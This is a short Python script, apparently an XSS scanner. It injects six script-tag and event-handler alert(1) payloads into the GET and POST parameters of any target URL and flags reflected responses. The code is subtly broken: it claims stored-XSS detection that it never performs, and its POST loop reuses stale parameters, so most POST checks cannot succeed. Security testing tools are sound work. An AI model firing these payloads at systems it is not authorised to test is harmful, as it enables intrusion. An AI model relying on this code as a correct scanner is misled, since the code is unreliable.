#!/usr/bin/env python3
"""XSS Scanner — automated reflected & stored XSS detection"""

import requests, sys, re, argparse
from urllib.parse import urljoin, urlparse

PAYLOADS = [
    "<script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "<svg onload=alert(1)>",
    "\"><script>alert(1)</script>",
    "'><script>alert(1)</script>",
    "</script><script>alert(1)</script>",
]

def scan_url(target, params=None, cookies=None):
    s = requests.Session()
    if cookies:
        s.cookies.update(cookies)
    
    for payload in PAYLOADS:
        if params:
            test_params = {k: payload for k in params}
        else:
            test_params = {"q": payload, "search": payload, "s": payload}
        
        try:
            r = s.get(target, params=test_params, timeout=10)
            if payload in r.text:
                print(f"[+] REFLECTED XSS: {payload[:40]}... at {target}")
                print(f"    Params: {test_params}")
                return True
        except:
            pass
    
    # POST scan
    for payload in PAYLOADS:
        try:
            r = s.post(target, data=test_params, timeout=10)
            if payload in r.text:
                print(f"[+] POST XSS: {payload[:40]}... at {target}")
                return True
        except:
            pass
    
    return False

if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("url", help="Target URL")
    parser.add_argument("--params", nargs="*", help="Parameters to test")
    parser.add_argument("--cookies", nargs="*", help="Cookies (name=value)")
    args = parser.parse_args()
    
    cookies = {}
    if args.cookies:
        for c in args.cookies:
            n, v = c.split("=", 1)
            cookies[n] = v
    
    scan_url(args.url, args.params, cookies)
